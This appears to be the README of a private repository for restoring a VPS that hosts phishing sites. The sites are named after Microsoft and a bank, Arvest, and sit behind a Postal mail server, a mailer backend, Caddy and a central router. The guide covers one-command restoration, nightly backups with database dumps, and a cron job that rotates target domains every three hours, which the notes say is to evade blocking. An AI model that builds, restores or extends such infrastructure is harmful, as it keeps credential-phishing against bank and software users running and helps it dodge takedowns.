# VPS Disaster Recovery & Infrastructure as Code (IaC)

This repository contains the complete infrastructure definition, configuration files, application code, phishing site assets, cron routines, and database backups required to fully reconstruct your VPS environment on a clean server in minutes.

## Key Features

- 🔄 **Automated Domain Rotation:** Built-in system to rotate target domains every 3 hours for security.
- 🛡️ **Disaster Recovery:** One-command restoration of the entire stack (Postal, Caddy, Node.js, Database).
- 📦 **Complete Backup:** Daily automated backups of configs, apps, and database to this private repository.

---

## Repository Structure

```text
vps-setup/
├── apps/
│   ├── <app-name>/              # Phishing site assets (e.g., microsoft, arvest)
│   │   ├── index.html
│   │   └── ...
│   └── mailef-backend/          # Node.js backend source code
├── configs/
│   ├── Caddyfile                # Reverse proxy configuration (Auto-generated)
│   ├── postal.yml               # Postal mail server configuration
│   ├── signing.key              # Fast signing key for Postal
│   ├── apps-map.json            # Router mapping configuration (CRITICAL)
│   ├── rotate-domains.sh        # Caddy configuration script
│   ├── rotate-app.sh            # Individual app rotation script
│   ├── rotate-all-apps.sh       # Master rotation script (Runs via Cron)
│   └── router.js                # Central routing script (Port 3005)
├── cron/
│   ├── staticroute              # Boot-time static route script (/etc/cron.d/staticroute)
│   └── root-crontab             # Backup of active crontab entries
├── database/
│   └── all_databases.sql        # Complete MariaDB database dump
├── ADD_NEW_APP.md               # Guide: How to add new apps
├── auto-sync.sh                 # Automated daily backup & GitHub push script
├── docker-compose.yml           # Container orchestration (MariaDB, Caddy, Postal)
├── restore.sh                   # Single-command restoration script
└── README.md                    # Disaster recovery documentation
```

---

## Complete Restoration Guide (New VPS)

### Step 1: Provision & Access Your Fresh VPS
1. Purchase or spin up a fresh Ubuntu or Debian server with root access.
2. SSH into your new server:
   ```bash
   ssh root@<NEW_VPS_IP>
   ```

### Step 2: Clone the Repository
Clone your IaC repository onto the fresh server using your GitHub account and Personal Access Token (PAT):
```bash
cd ~
git clone https://<USERNAME>:<PAT_TOKEN>@github.com/<USERNAME>/vps-setup.git
cd vps-setup
```
*(Replace `<USERNAME>` and `<PAT_TOKEN>` with your actual GitHub credentials).*

### Step 3: Execute the Automated Restore
Run the master restoration script:
```bash
chmod +x restore.sh
./restore.sh
```

---

## What `restore.sh` Does Automatically

1. **Installs System Dependencies:** Updates apt repositories and installs `curl`, `git`, `ufw`, `jq`, `Docker`, `Node.js`, and `PM2`.
2. **Restores Configurations:** Copies Postal configs, rotation scripts, and router to `/opt/postal/`.
3. **Restores Applications:** Deploys all site assets to `/opt/postal/caddy-data/apps/`.
4. **Restores Backend:** Deploys `mailer-backend` to `/opt/mailef-backend/` and installs production dependencies.
5. **Configures Firewall (UFW):** Sets default deny rules for incoming traffic and enables required ports:
   - `22/tcp` (OpenSSH)
   - `80/tcp` & `443/tcp` (Web / SSL certificates)
   - `25/tcp` & `587/tcp` (SMTP & Submission)
6. **Boots Docker Stack:** Starts MariaDB, Caddy, and Postal containers via `docker-compose.yml`.
7. **Restores Database:** Waits for MariaDB to become active and imports `database/all_databases.sql`.
8. **Launches PM2 Applications:** Starts `mailer-backend` and `central-router`, saves process list (`pm2 save`), and enables systemd auto-start on boot.
9. **Re-installs Cron Jobs:** Restores the backup and domain rotation cron jobs.

---

## Verification & Health Checks

After `restore.sh` finishes execution, verify system integrity using these commands:

### 1. Verify Docker Services
```bash
docker ps -a
```
*Expected Output:* Three containers (`postal-mariadb`, `postal-caddy`, `postal-worker`, `postal-web`, `postal-smtp`) showing status `Up`.

### 2. Verify PM2 Services
```bash
pm2 list
```
*Expected Output:* `mailer-backend` and `central-router` showing status `online`.

### 3. Verify Firewall Configuration
```bash
ufw status verbose
```
*Expected Output:* Status `active` with ports 22, 80, 443, 25, and 587 allowed.

### 4. Verify Domain Rotation System (CRITICAL)
Ensure the rotation scripts are present and executable:
```bash
ls -la /opt/postal/rotate-*.sh
```
*Expected Output:* Files `rotate-domains.sh`, `rotate-app.sh`, and `rotate-all-apps.sh` should exist and be executable (`-rwxr-xr-x`).

Test the rotation system manually (optional):
```bash
/opt/postal/rotate-all-apps.sh
```
Check logs for `SUCCESS` messages.

### 5. Verify Cron Jobs
Ensure the automated tasks are scheduled:
```bash
crontab -l
```
*Expected Output:* You should see entries for:
- `auto-sync.sh` (Daily backup)
- `rotate-all-apps.sh` (Domain rotation every 3 hours)

---

## Automated Backup System (`auto-sync.sh`)

This setup includes an automated daily backup script that extracts latest configurations, app assets, dumps MariaDB state, and commits changes back to GitHub.

### Manual Backup Run
To trigger an immediate state sync:
```bash
/root/vps-setup/auto-sync.sh
```

### Cron Schedule
The backup job is configured in root's crontab to execute every night at 2:00 AM:
```cron
0 2 * * * /root/vps-setup/auto-sync.sh >> /var/log/vps-backup.log 2>&1
```

### Inspecting Backup Logs
Check execution output or troubleshoot issues:
```bash
cat /var/log/vps-backup.log
```

---

## Adding New Applications

To add a new site (e.g., "bank", "company") to the rotation system:
1. Follow the step-by-step guide in `ADD_NEW_APP.md`.
2. The system will automatically generate a unique domain and include it in the rotation schedule.

---

## Security Notes

- **Private Repository:** Ensure this Git repository is **PRIVATE**. It contains sensitive configurations, database dumps, and signing keys.
- **Access Control:** Limit access to the GitHub repository and the VPS root account.
- **Rotation:** The domain rotation system automatically changes target domains every 3 hours to evade blocking. Do not disable this unless necessary.
- **Logs:** Regularly check `/var/log/domain-rotation.log` and `/var/log/vps-backup.log` for anomalies.
